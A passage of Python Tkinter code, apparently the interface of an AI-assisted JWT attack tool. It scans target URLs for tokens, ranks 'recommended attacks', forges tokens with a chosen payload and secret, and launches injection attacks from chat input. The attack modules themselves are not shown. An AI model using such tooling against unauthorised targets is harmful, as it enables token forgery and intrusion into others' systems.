        self.token_details_text.insert(tk.END, f"{token}\n\n")
        
        if not analysis.get('valid', False):
            self.token_details_text.insert(tk.END, f"Error: {analysis.get('error', 'Invalid token')}\n")
            self.token_details_text.config(state=tk.DISABLED)
            return
        
        # Display header
        self.token_details_text.insert(tk.END, "Header:\n", "header")
        header = analysis.get('header', {})
        for key, value in header.items():
            self.token_details_text.insert(tk.END, f"  {key}: {value}\n")
        
        # Display payload
        self.token_details_text.insert(tk.END, "\nPayload:\n", "payload")
        payload = analysis.get('payload', {})
        for key, value in payload.items():
            self.token_details_text.insert(tk.END, f"  {key}: {value}\n")
        
        # Display signature information
        self.token_details_text.insert(tk.END, "\nSignature:\n", "signature")
        if len(token.split('.')) > 2:
            self.token_details_text.insert(tk.END, f"  {token.split('.')[2]}\n")
        
        self.token_details_text.config(state=tk.DISABLED)
    
    def update_token_vulnerabilities(self, analysis, recommendations):
        """Update the token vulnerabilities display"""
        self.token_vulns_text.config(state=tk.NORMAL)
        self.token_vulns_text.delete(1.0, tk.END)
        
        # Display vulnerabilities
        self.token_vulns_text.insert(tk.END, "Vulnerabilities:\n", "title")
        vulnerabilities = analysis.get('vulnerabilities', [])
        
        if not vulnerabilities:
            self.token_vulns_text.insert(tk.END, "  No vulnerabilities detected\n")
        else:
            for vuln in vulnerabilities:
                severity = vuln.get('severity', 'medium')
                self.token_vulns_text.insert(
                    tk.END,
                    f"  • {vuln.get('type')}: {severity.upper()}\n",
                    severity
                )
        
        # Display attack recommendations
        self.token_vulns_text.insert(tk.END, "\nRecommended Attacks:\n", "title")
        recommended_attacks = analysis.get('recommended_attacks', [])
        
        if not recommended_attacks:
            self.token_vulns_text.insert(tk.END, "  No specific attack recommendations\n")
        else:
            for attack in recommended_attacks:
                self.token_vulns_text.insert(tk.END, f"  • {attack}\n")
        
        # Display recommended tools
        if 'recommended_tools' in recommendations:
            self.token_vulns_text.insert(tk.END, "\nRecommended Tools:\n", "title")
            for tool in recommendations.get('recommended_tools', []):
                self.token_vulns_text.insert(tk.END, f"  • {tool}\n")
        
        # Display estimated success rate
        if 'confidence' in recommendations:
            confidence = recommendations.get('confidence', 0) * 100
            self.token_vulns_text.insert(tk.END, "\nAttack Success Probability:\n", "title")
            
            if confidence > 70:
                self.token_vulns_text.insert(tk.END, f"  {confidence:.1f}%\n", "high")
            elif confidence > 30:
                self.token_vulns_text.insert(tk.END, f"  {confidence:.1f}%\n", "medium")
            else:
                self.token_vulns_text.insert(tk.END, f"  {confidence:.1f}%\n", "low")
        
        # Display estimated time
        if 'estimated_time' in recommendations:
            self.token_vulns_text.insert(tk.END, "\nEstimated Attack Time:\n", "title")
            self.token_vulns_text.insert(tk.END, f"  {recommendations.get('estimated_time')}\n")
        
        self.token_vulns_text.config(state=tk.DISABLED)
    
    def update_token_vulnerabilities_append(self, text, tag=None):
        """Append text to the token vulnerabilities display"""
        self.token_vulns_text.config(state=tk.NORMAL)
        if tag:
            self.token_vulns_text.insert(tk.END, text, tag)
        else:
            self.token_vulns_text.insert(tk.END, text)
        self.token_vulns_text.config(state=tk.DISABLED)
    
    def clear_token_analysis(self):
        """Clear all token analysis display fields"""
        # Clear token details
        self.token_details_text.config(state=tk.NORMAL)
        self.token_details_text.delete(1.0, tk.END)
        self.token_details_text.config(state=tk.DISABLED)
        
        # Clear vulnerabilities
        self.token_vulns_text.config(state=tk.NORMAL)
        self.token_vulns_text.delete(1.0, tk.END)
        self.token_vulns_text.config(state=tk.DISABLED)
        
        # Reset status
        self.status_msg.set("Pronto")
    
    def browse_output_file(self):
        """Open file dialog to select output file"""
        file_path = filedialog.asksaveasfilename(
            title="Save Scan Results",
            defaultextension=".json",
            filetypes=[("JSON Files", "*.json"), ("All Files", "*.*")]
        )
        if file_path:
            self.output_entry.delete(0, tk.END)
            self.output_entry.insert(0, file_path)
    
    def scan_target(self):
        """Scan the target URL for JWT tokens and vulnerabilities"""
        # Get the URL
        url = self.url_entry.get().strip()
        
        if not url:
            messagebox.showerror("Error", "Please enter a target URL")
            return
        
        # Check if attack modules are available
        if not HAS_ATTACK_MODULES:
            messagebox.showerror("Error", "Attack modules are not available. Please check the logs.")
            return
        
        # Validate URL format
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, url)
        
        # Get output file and verbose flag
        output_file = self.output_entry.get().strip() or None
        verbose = self.verbose_var.get()
        
        # Update status
        self.status_msg.set("Scanning target...")
        
        # Clear previous results
        self.scan_output_text.config(state=tk.NORMAL)
        self.scan_output_text.delete(1.0, tk.END)
        self.scan_output_text.config(state=tk.DISABLED)
        
        self.tokens_list.delete(0, tk.END)
        
        # Adicionar log para depuração
        print(f"Iniciando escaneamento de {url}")
        self.update_scan_output(f"Iniciando escaneamento de {url}...\n", "info")
        
        # Run scan in background thread
        def run_scan():
            try:
                # Check if modules are available
                from modules.scan_target import TargetScanner
                
                # Show scan starting
                self.master.after(0, lambda: self.update_scan_output(
                    f"Starting scan of {url}\n\n", "header"
                ))
                
                # Create scanner and run scan
                scanner = TargetScanner(url)
                scan_results = scanner.scan()
                
                # Update scan output with results
                if scan_results.get('error'):
                    self.master.after(0, lambda: self.update_scan_output(
                        f"Error during scan: {scan_results.get('error')}\n", "error"
                    ))
                else:
                    # Display general scan info
                    self.master.after(0, lambda: self.update_scan_output(
                        "Scan completed successfully.\n", "success"
                    ))
                    
                    # Display found tokens
                    tokens = scan_results.get('tokens', [])
                    jwt_cookies = scan_results.get('jwt_cookies', [])
                    
                    self.master.after(0, lambda: self.update_scan_output(
                        f"\nFound {len(tokens)} JWT tokens and {len(jwt_cookies)} JWT cookies.\n\n", 
                        "info"
                    ))
                    
                    # Add tokens to the list
                    for token in tokens:
                        token_value = token.get('value', '')
                        self.master.after(0, lambda tv=token_value: self.tokens_list.insert(tk.END, tv))
                    
                    for cookie in jwt_cookies:
                        cookie_value = cookie.get('value', '')
                        self.master.after(0, lambda cv=cookie_value: self.tokens_list.insert(tk.END, cv))
                    
                    # Display endpoints
                    self.master.after(0, lambda: self.update_scan_output(
                        "Detected Endpoints:\n", "header"
                    ))
                    
                    for endpoint in scan_results.get('endpoints', []):
                        self.master.after(0, lambda ep=endpoint: self.update_scan_output(
                            f"  • {ep}\n", "info"
                        ))
                    
                    # Display vulnerabilities
                    vulnerabilities = scan_results.get('vulnerabilities', [])
                    if vulnerabilities:
                        self.master.after(0, lambda: self.update_scan_output(
                            "\nVulnerabilities:\n", "header"
                        ))
                        
                        for vuln in vulnerabilities:
                            severity = vuln.get('severity', 'medium')
                            severity_tag = "error" if severity == "high" else (
                                "warning" if severity == "medium" else "info"
                            )
                            self.master.after(0, lambda v=vuln, st=severity_tag: self.update_scan_output(
                                f"  • {v.get('type')}: {v.get('description')}\n", st
                            ))
                    
                    # Display security headers
                    security_headers = scan_results.get('security_headers', {})
                    if security_headers:
                        self.master.after(0, lambda: self.update_scan_output(
                            "\nSecurity Headers:\n", "header"
                        ))
                        
                        for header, info in security_headers.items():
                            present = info.get('present', False)
                            status_tag = "success" if present else "error"
                            self.master.after(0, lambda h=header, p=present, st=status_tag: self.update_scan_output(
                                f"  • {h}: {'Present' if p else 'Missing'}\n", st
                            ))
                    
                    # Save results to file if specified
                    if output_file:
                        try:
                            with open(output_file, 'w') as f:
                                json.dump(scan_results, f, indent=2)
                            self.master.after(0, lambda of=output_file: self.update_scan_output(
                                f"\nResults saved to: {of}\n", "success"
                            ))
                        except Exception as e:
                            self.master.after(0, lambda err=str(e): self.update_scan_output(
                                f"\nError saving results: {err}\n", "error"
                            ))
                
                self.master.after(0, lambda: self.status_msg.set("Scan completed"))
                
            except Exception as e:
                self.master.after(0, lambda: self.update_scan_output(
                    f"Error during scan: {str(e)}\n", "error"
                ))
                self.master.after(0, lambda: self.status_msg.set(f"Scan failed: {str(e)}"))
        
        # Adicionar log para depuração
        print("Iniciando thread de escaneamento")
        
        # Iniciar a thread
        scan_thread = threading.Thread(target=run_scan, daemon=True)
        scan_thread.start()
        print("Thread de escaneamento iniciada")
    
    def update_scan_output(self, text, tag=None):
        """Update the scan output text widget"""
        self.scan_output_text.config(state=tk.NORMAL)
        if tag:
            self.scan_output_text.insert(tk.END, text, tag)
        else:
            self.scan_output_text.insert(tk.END, text)
        self.scan_output_text.see(tk.END)
        self.scan_output_text.config(state=tk.DISABLED)
    
    def analyze_selected_token(self):
        """Analyze the selected token from the list"""
        selected_indices = self.tokens_list.curselection()
        if not selected_indices:
            messagebox.showinfo("No Selection", "Please select a token to analyze")
            return
        
        # Get the selected token
        token = self.tokens_list.get(selected_indices[0])
        
        # Switch to token analysis tab
        self.notebook.select(self.token_analysis_tab)
        
        # Set the token in the entry field
        self.token_entry.delete(0, tk.END)
        self.token_entry.insert(0, token)
        
        # Trigger token analysis
        self.analyze_token()
    
    def clear_scan(self):
        """Clear all scan fields and results"""
        self.url_entry.delete(0, tk.END)
        self.output_entry.delete(0, tk.END)
        self.verbose_var.set(True)
        
        self.scan_output_text.config(state=tk.NORMAL)
        self.scan_output_text.delete(1.0, tk.END)
        self.scan_output_text.config(state=tk.DISABLED)
        
        self.tokens_list.delete(0, tk.END)
        
        self.status_msg.set("Ready")

    def setup_settings_tab(self):
        """Setup the settings tab"""
        self.settings_frame = tk.Frame(self.settings_tab, bg="#1e1e1e")
        self.settings_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # API Keys section
        self.api_keys_frame = tk.LabelFrame(
            self.settings_frame,
            text="Credenciais de API",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.api_keys_frame.pack(fill=tk.X, padx=10, pady=(0, 20))
        
        # OpenAI API Key
        self.openai_frame = tk.Frame(self.api_keys_frame, bg="#252525")
        self.openai_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.openai_label = tk.Label(
            self.openai_frame,
            text="OpenAI API Key:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.openai_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.openai_entry = tk.Entry(
            self.openai_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white",
            show="*"
        )
        self.openai_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # HuggingFace Token
        self.hf_frame = tk.Frame(self.api_keys_frame, bg="#252525")
        self.hf_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.hf_label = tk.Label(
            self.hf_frame,
            text="HuggingFace Token:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.hf_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.hf_entry = tk.Entry(
            self.hf_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white",
            show="*"
        )
        self.hf_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        self.hf_help_btn = tk.Button(
            self.hf_frame,
            text="?",
            command=self.show_hf_token_help,
            bg="#333333",
            fg="white",
            width=2
        )
        self.hf_help_btn.pack(side=tk.LEFT)
        
        # Test connection button
        self.test_btn_frame = tk.Frame(self.api_keys_frame, bg="#252525")
        self.test_btn_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.test_api_btn = tk.Button(
            self.test_btn_frame,
            text="Test API Connection",
            command=self.test_api_connection,
            bg="#b00a0a",
            fg="white",
            width=20
        )
        self.test_api_btn.pack(side=tk.RIGHT, padx=10)
        
        # Save settings
        self.save_settings_frame = tk.Frame(self.settings_frame, bg="#1e1e1e")
        self.save_settings_frame.pack(fill=tk.X, pady=10)
        
        self.save_btn = tk.Button(
            self.save_settings_frame,
            text="Save Settings",
            command=self.save_settings,
            bg="#b00a0a",
            fg="white",
            font=("Arial", 10, "bold"),
            width=15
        )
        self.save_btn.pack(anchor="center", padx=(0, 10))
        
        # Settings status and tooltip area
        self.settings_status_label = tk.Label(
            self.settings_frame,
            text="",
            font=("Arial", 10),
            fg="white",
            bg="#1e1e1e"
        )
        self.settings_status_label.pack(fill=tk.X, pady=10)
        # Simple tooltip binding to status label
        def bind_tooltip(widget, text):
            widget.bind("<Enter>", lambda e: self.settings_status_label.config(text=text))
            widget.bind("<Leave>", lambda e: self.settings_status_label.config(text=""))
        bind_tooltip(self.openai_entry, "Chave de API da OpenAI usada para autenticar chamadas")
        bind_tooltip(self.hf_entry, "Token de acesso à API da HuggingFace para inferência de IA")
        bind_tooltip(self.test_api_btn, "Testa a conexão com a API selecionada")
        bind_tooltip(self.save_btn, "Salva as configurações atuais de API e parâmetros")
    
    def show_hf_token_help(self):
        """Show help information about HuggingFace token"""
        help_text = (
            "O token HuggingFace é usado para acessar a API de inferência de IA.\n\n"
            "Para obter um token gratuito:\n"
            "1. Crie uma conta em https://huggingface.co/\n"
            "2. Vá para Settings -> Access Tokens\n"
            "3. Crie um novo token e cole-o aqui\n\n"
            "A API gratuita permite um limite de requisições por dia."
        )
        messagebox.showinfo("Token HuggingFace", help_text)
    
    def save_settings(self):
        """Save settings"""
        theme = self.theme_var.get()
        language = self.language_var.get()
        hf_token = self.hf_token_var.get()
        
        # Novas configurações
        openai_api_key = self.openai_var.get()
        openai_model = self.openai_model_var.get()
        ollama_url = self.ollama_var.get()
        ollama_model = self.ollama_model_var.get()
        custom_api_url = self.custom_api_var.get()
        preferred_api = self.preferred_api_var.get()
        
        # Salvar o token HuggingFace como variável de ambiente
        if hf_token:
            os.environ["HF_TOKEN"] = hf_token
        
        # Salvar a API Key OpenAI como variável de ambiente
        if openai_api_key:
            os.environ["OPENAI_API_KEY"] = openai_api_key
            
        # Salvar em arquivo de configuração para uso futuro
        try:
            config_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "config")
            os.makedirs(config_dir, exist_ok=True)
            
            config_file = os.path.join(config_dir, "ai_config.json")
            
            # Carregar configuração existente ou criar nova
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    config = json.load(f)
            else:
                config = {}
            
            # Atualizar configurações
            config["hf_token"] = hf_token
            config["openai_api_key"] = openai_api_key
            config["openai_model"] = openai_model
            config["ollama_url"] = ollama_url
            config["ollama_model"] = ollama_model
            config["custom_api_url"] = custom_api_url
            config["preferred_api"] = preferred_api
            config["theme"] = theme
            config["language"] = language
            
            # Salvar configuração
            with open(config_file, 'w') as f:
                json.dump(config, f)
                
            # Reinicializar componentes de IA se necessário
            self.reinitialize_ai_components()
                
        except Exception as e:
            logger = logging.getLogger('AI_INTERFACE')
            logger.error(f"Erro ao salvar configurações: {str(e)}")
        
        messagebox.showinfo("Configurações", "Configurações salvas com sucesso!")
        self.status_msg.set("Configurações atualizadas")

    def test_api_connection(self):
        """Testa a conexão com a API selecionada"""
        api_type = self.preferred_api_var.get()
        
        try:
            if api_type == "OpenAI":
                api_key = self.openai_var.get()
                model = self.openai_model_var.get()
                
                if not api_key:
                    messagebox.showerror("Erro", "API Key da OpenAI não configurada")
                    return
                
                # Testar conexão com OpenAI
                import requests
                headers = {
                    "Authorization": f"Bearer {api_key}",
                    "Content-Type": "application/json"
                }
                data = {
                    "model": model,
                    "messages": [{"role": "user", "content": "Teste de conexão"}],
                    "max_tokens": 5
                }
                response = requests.post(
                    "https://api.openai.com/v1/chat/completions",
                    headers=headers,
                    json=data
                )
                
                if response.status_code == 200:
                    messagebox.showinfo("Sucesso", f"Conexão com OpenAI ({model}) estabelecida com sucesso!")
                else:
                    messagebox.showerror("Erro", f"Falha na conexão: {response.status_code} - {response.text}")
            
            elif api_type == "Ollama":
                url = self.ollama_var.get()
                model = self.ollama_model_var.get()
                
                if not url:
                    messagebox.showerror("Erro", "URL do Ollama não configurada")
                    return
                
                # Testar conexão com Ollama
                import requests
                data = {
                    "model": model,
                    "prompt": "Teste de conexão",
                    "stream": False
                }
                response = requests.post(
                    f"{url}/api/generate",
                    json=data
                )
                
                if response.status_code == 200:
                    messagebox.showinfo("Sucesso", f"Conexão com Ollama ({model}) estabelecida com sucesso!")
                else:
                    messagebox.showerror("Erro", f"Falha na conexão: {response.status_code} - {response.text}")
            
            elif api_type == "HuggingFace":
                token = self.hf_token_var.get()
                
                if not token:
                    messagebox.showerror("Erro", "Token HuggingFace não configurado")
                    return
                
                # Testar conexão com HuggingFace
                import requests
                headers = {
                    "Authorization": f"Bearer {token}",
                    "Content-Type": "application/json"
                }
                response = requests.post(
                    "https://api-inference.huggingface.co/models/gpt2",
                    headers=headers,
                    json={"inputs": "Teste de conexão"}
                )
                
                if response.status_code == 200:
                    messagebox.showinfo("Sucesso", "Conexão com HuggingFace estabelecida com sucesso!")
                else:
                    messagebox.showerror("Erro", f"Falha na conexão: {response.status_code} - {response.text}")
            
            elif api_type == "Personalizada":
                url = self.custom_api_var.get()
                
                if not url:
                    messagebox.showerror("Erro", "URL da API personalizada não configurada")
                    return
                
                # Testar conexão com API personalizada
                import requests
                response = requests.get(url)
                
                if response.status_code == 200:
                    messagebox.showinfo("Sucesso", "Conexão com API personalizada estabelecida com sucesso!")
                else:
                    messagebox.showerror("Erro", f"Falha na conexão: {response.status_code} - {response.text}")
            
            elif api_type == "Llama":
                # Verificar disponibilidade do CLI 'llama'
                try:
                    import subprocess
                    subprocess.run(["llama", "model", "list"], check=True, capture_output=True)
                    messagebox.showinfo("Sucesso", "CLI llama instalado e pronto para uso!")
                except Exception as e:
                    messagebox.showerror("Erro", f"Erro ao executar 'llama model list': {str(e)}")
                return
        
        except Exception as e:
            messagebox.showerror("Erro", f"Erro ao testar conexão: {str(e)}")

    def setup_chat_panel(self):
        """Método mantido para compatibilidade, não faz nada"""
        pass

    def shutdown(self):
        """Chamado quando a aplicação é fechada"""
        try:
            # Desligar o servidor LLM se estiver ativo
            if hasattr(self, 'llm_api') and self.llm_api and hasattr(self.llm_api, 'shutdown'):
                self.llm_api.shutdown()
        except Exception as e:
            logger = logging.getLogger('AI_INTERFACE')
            logger.error(f"Erro ao desligar a API LLM: {str(e)}")

    def reinitialize_ai_components(self):
        """Reinitialize AI components"""
        try:
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write("Reinicializando componentes de IA...\n")
            
            self.ai_engine = None
            self.chat_manager = None
            if HAS_AI_MODULES:
                try:
                    from ai_system.engine import AIEngine
                    self.ai_engine = AIEngine()
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write("Engine de IA inicializado com sucesso.\n", "success")
                except Exception as e:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Erro ao inicializar engine de IA: {str(e)}\n", "error")
                    print(f"Erro ao inicializar engine de IA: {str(e)}")
            else:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Módulos de IA não disponíveis. Verifique a instalação.\n", "error")
                print("Módulos de IA não disponíveis. Verifique a instalação.")

            # Tentar inicializar o gerenciador de chat
            if AI_MODULE_AVAILABLE:
                try:
                    from ai_module.chat_manager import ChatManager
                    self.chat_manager = ChatManager()
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write("Gerenciador de chat inicializado com sucesso.\n", "success")
                except Exception as e:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Erro ao inicializar gerenciador de chat: {str(e)}\n", "error")
                    print(f"Erro ao inicializar gerenciador de chat: {str(e)}")
            else:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Módulo de chat não disponível. Verifique a instalação.\n", "error")
                print("Módulo de chat não disponível. Verifique a instalação.")

            # Verificar se a API da OpenAI está disponível
            if self.chat_manager:
                try:
                    # Tentar carregar a chave da API do ambiente
                    api_key = os.environ.get("OPENAI_API_KEY", "")
                    if api_key:
                        if hasattr(self, 'ai_console') and self.ai_console is not None:
                            self.ai_console.write("Chave de API da OpenAI encontrada no ambiente.\n", "success")
                    else:
                        if hasattr(self, 'ai_console') and self.ai_console is not None:
                            self.ai_console.write("Chave de API da OpenAI não encontrada no ambiente. Verifique as configurações.\n", "warning")
                        print("Chave de API da OpenAI não encontrada no ambiente. Verifique as configurações.")
                except Exception as e:
                    if hasattr(self, 'ai_console') and self.ai_console is not None:
                        self.ai_console.write(f"Erro ao verificar chave de API da OpenAI: {str(e)}\n", "error")
                    print(f"Erro ao verificar chave de API da OpenAI: {str(e)}")
            else:
                if hasattr(self, 'ai_console') and self.ai_console is not None:
                    self.ai_console.write("Gerenciador de chat não inicializado. API de IA não disponível.\n", "error")
                print("Gerenciador de chat não inicializado. API de IA não disponível.")
        except Exception as e:
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write(f"Erro ao reinicializar componentes de IA: {str(e)}\n", "error")
            if hasattr(self, 'status_msg'):
                self.status_msg.set("Erro na inicialização da IA")
            self.chat_manager = None
            if hasattr(self, 'ai_console') and self.ai_console is not None:
                self.ai_console.write("API de IA não disponível após reinicialização. Usando respostas padrão.\n", "warning")

    def _run_attack_from_chat(self, url):
        """
        Executa um ataque a partir de uma URL fornecida no chat
        """
        try:
            self.add_chat_message("Debug", f"Iniciando thread de ataque para {url}", "debug")
            from ai_system.main import initiate_attack_from_url
            results = initiate_attack_from_url(url, verbose=True)
            # Formatando resultados para exibição no chat
            result_text = f"Resultados do ataque à URL {url}:\n\n"
            if 'successful_injections' in results and results['successful_injections']:
                result_text += "✅ Injeções bem-sucedidas encontradas!\n"
                for i, inj in enumerate(results['successful_injections'], 1):
                    result_text += f"  {i}. Estratégia: {inj.get('strategy', 'Desconhecida')}\n"
                    result_text += f"      Resposta: {inj.get('response', {}).get('status_code', 'N/A')} - {inj.get('response', {}).get('body', 'N/A')[:100]}...\n"
            else:
                result_text += "❌ Nenhuma injeção bem-sucedida encontrada.\n"
            if 'vulnerabilities' in results and results['vulnerabilities']:
                result_text += "\nVulnerabilidades detectadas:\n"
                for i, vuln in enumerate(results['vulnerabilities'], 1):
                    result_text += f"  {i}. {vuln.get('type', 'Desconhecido')} - Severidade: {vuln.get('severity', 'N/A')}\n"
                    result_text += f"      Descrição: {vuln.get('description', 'N/A')}\n"
            self.add_chat_message("Assistente", result_text, "assistant")
            if hasattr(self, 'conversation_history'):
                self.conversation_history.append({"role": "assistant", "content": result_text})
            else:
                self.chat_history.append({"role": "assistant", "content": result_text})
        except Exception as e:
            error_msg = f"Erro ao executar o ataque à URL {url}: {str(e)}"
            self.add_chat_message("Assistente", error_msg, "assistant")
            self.add_chat_message("Debug", f"Erro na thread de ataque: {str(e)}", "debug")
            if hasattr(self, 'conversation_history'):
                self.conversation_history.append({"role": "assistant", "content": error_msg})
            else:
                self.chat_history.append({"role": "assistant", "content": error_msg})
            logger.error(error_msg)

    def send_chat_tab_message(self, event=None):
        """Send a chat message from the dedicated chat tab"""
        message = self.chat_entry_tab.get().strip()
        if message:
            self.add_chat_message("Você", message, "user")
            self.chat_entry_tab.delete(0, tk.END)
            if hasattr(self, 'chat_manager') and self.chat_manager is not None:
                response = self.process_chat_message(message)
            else:
                response = "Desculpe, a API de IA não está disponível no momento. Por favor, verifique as configurações."
            self.add_chat_message("Assistente", response, "assistant")

    def _list_program_functions(self):
        """Walk the codebase and list all Python function definitions."""
        funcs = []
        root = Path(__file__).resolve().parent.parent
        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                if fname.endswith('.py'):
                    fpath = os.path.join(dirpath, fname)
                    try:
                        with open(fpath, 'r', encoding='utf-8') as f:
                            tree = ast.parse(f.read())
                        for node in ast.walk(tree):
                            if isinstance(node, ast.FunctionDef):
                                rel = os.path.relpath(fpath, root)
                                funcs.append(f"{rel} -> {node.name}")
                    except Exception:
                        continue
        return funcs

    def setup_token_analysis_tab(self):
        """Setup the token analysis tab"""
        self.token_frame = tk.Frame(self.token_analysis_tab, bg="#1e1e1e")
        self.token_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Token input section
        self.token_input_frame = tk.LabelFrame(
            self.token_frame,
            text="JWT Token",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.token_input_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Token entry
        self.token_entry_frame = tk.Frame(self.token_input_frame, bg="#252525")
        self.token_entry_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.token_label = tk.Label(
            self.token_entry_frame,
            text="JWT Token:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.token_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.token_entry = tk.Entry(
            self.token_entry_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.token_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # File input for token
        self.token_file_frame = tk.Frame(self.token_input_frame, bg="#252525")
        self.token_file_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.token_file_label = tk.Label(
            self.token_file_frame,
            text="Token File:",
            font=("Arial", 10),
            fg="white",
            bg="#252525"
        )
        self.token_file_label.pack(side=tk.LEFT, padx=(0, 10))
        
        self.token_file_entry = tk.Entry(
            self.token_file_frame,
            font=("Consolas", 10),
            bg="#333333",
            fg="white"
        )
        self.token_file_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        
        self.token_file_btn = tk.Button(
            self.token_file_frame,
            text="Browse",
            command=self.browse_token_file,
            bg="#333333",
            fg="white"
        )
        self.token_file_btn.pack(side=tk.LEFT)
        
        # Action buttons
        self.token_action_frame = tk.Frame(self.token_input_frame, bg="#252525")
        self.token_action_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        self.analyze_btn = tk.Button(
            self.token_action_frame,
            text="Analyze Token",
            command=self.analyze_token,
            bg="#b00a0a",
            fg="white",
            font=("Arial", 10, "bold"),
            width=15
        )
        self.analyze_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        self.clear_token_btn = tk.Button(
            self.token_action_frame,
            text="Clear",
            command=self.clear_token_analysis,
            bg="#333333",
            fg="white",
            width=10
        )
        self.clear_token_btn.pack(side=tk.LEFT)
        
        # Results section - split into left and right panes
        self.token_results_frame = tk.Frame(self.token_frame, bg="#1e1e1e")
        self.token_results_frame.pack(fill=tk.BOTH, expand=True)
        
        # Left pane - Token details
        self.details_frame = tk.LabelFrame(
            self.token_results_frame,
            text="Token Details",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.details_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        self.details_text = scrolledtext.ScrolledText(
            self.details_frame,
            bg="#333333",
            fg="white",
            font=("Consolas", 10),
            height=15
        )
        self.details_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.details_text.config(state=tk.DISABLED)
        
        # Right pane - Vulnerabilities
        self.vuln_frame = tk.LabelFrame(
            self.token_results_frame,
            text="Vulnerabilities && Recommendations",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.vuln_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        self.vuln_text = scrolledtext.ScrolledText(
            self.vuln_frame,
            bg="#333333",
            fg="white",
            font=("Consolas", 10),
            height=15
        )
        self.vuln_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.vuln_text.config(state=tk.DISABLED)
        # Add Interceptação e Manipulação de Token section
        self.manipulation_frame = tk.LabelFrame(
            self.token_frame,
            text="Interceptação e Manipulação de Token",
            font=("Arial", 12, "bold"),
            fg="white",
            bg="#252525",
            bd=1
        )
        self.manipulation_frame.pack(fill=tk.BOTH, expand=True, pady=(20,0), padx=10)
        tk.Label(self.manipulation_frame, text="Header (JSON):", fg="white", bg="#252525", font=("Arial",10,"bold")).pack(anchor="w", padx=10)
        self.header_text = scrolledtext.ScrolledText(self.manipulation_frame, bg="#333333", fg="white", font=("Consolas",10), height=5)
        self.header_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0,10))
        tk.Label(self.manipulation_frame, text="Payload (JSON):", fg="white", bg="#252525", font=("Arial",10,"bold")).pack(anchor="w", padx=10)
        self.payload_text = scrolledtext.ScrolledText(self.manipulation_frame, bg="#333333", fg="white", font=("Consolas",10), height=5)
        self.payload_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0,10))
        secret_frame = tk.Frame(self.manipulation_frame, bg="#252525")
        secret_frame.pack(fill=tk.X, padx=10, pady=(0,10))
        tk.Label(secret_frame, text="Secret:", fg="white", bg="#252525").pack(side=tk.LEFT)
        self.secret_entry = tk.Entry(secret_frame, bg="#333333", fg="white")
        self.secret_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5,0))
        self.generate_manip_btn = tk.Button(self.manipulation_frame, text="Generate Token", command=self.generate_token_ui, bg="#b00a0a", fg="white", font=("Arial",10,"bold"))
        self.generate_manip_btn.pack(padx=10, pady=(0,10))
        tk.Label(self.manipulation_frame, text="Generated Token:", fg="white", bg="#252525", font=("Arial",10,"bold")).pack(anchor="w", padx=10)
        self.generated_token_entry = tk.Entry(self.manipulation_frame, bg="#333333", fg="white", font=("Consolas",10))
        self.generated_token_entry.pack(fill=tk.X, padx=10, pady=(0,10))

    def execute_terminal_command(self):
        """Execute a command in the terminal"""
        command = self.terminal_entry.get().strip()
        if command:
            self.terminal_text.config(state=tk.NORMAL)
            self.terminal_text.insert(tk.END, f"> {command}\n")
            self.terminal_text.see(tk.END)
            self.terminal_text.config(state=tk.DISABLED)
            self.terminal_entry.delete(0, tk.END)
            # Placeholder for actual command execution
            self.terminal_text.config(state=tk.NORMAL)
            self.terminal_text.insert(tk.END, f"Comando '{command}' executado. (Funcionalidade de terminal ainda não implementada completamente)\n")
            self.terminal_text.see(tk.END)
            self.terminal_text.config(state=tk.DISABLED)

    def setup_analysis_tab(self):
